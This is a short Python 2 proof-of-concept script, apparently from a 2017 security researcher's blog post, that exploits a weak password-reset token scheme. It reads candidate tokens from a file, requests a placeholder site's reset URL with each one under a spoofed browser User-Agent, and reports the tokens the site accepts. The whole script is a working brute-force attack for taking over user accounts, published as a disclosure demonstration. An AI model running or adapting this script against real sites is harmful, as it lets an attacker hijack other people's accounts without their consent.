#!/usr/bin/python
# POC of Weak Encryption Flaw
# Script used for demonstration in http://www.shawarkhan.com/2017/04/pwnage-of-every-user-due-to-weak.html
# Author: Shawar Khan

import os
import ssl
from urllib2 import Request,urlopen
f = open('hash','r')
for i in f.readlines():
	i = i.strip('\n')
	url = 'http://site.com/resetpass?email=emailhere@domain.com&token='+i
	print url
	si = Request(url)
	si.add_header('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0')
	req = urlopen(si)
	res = req.read()
	if "is invalid" in res:
		pass
	else:
		print "[+] Valid Hash Identified:"
		print "    -- Status: %s"%req.getcode()
		print "    -- Length: %s"%len(res)
		print "    -- Hash  : %s"%i
		print "    -- URL:  : %s"%url
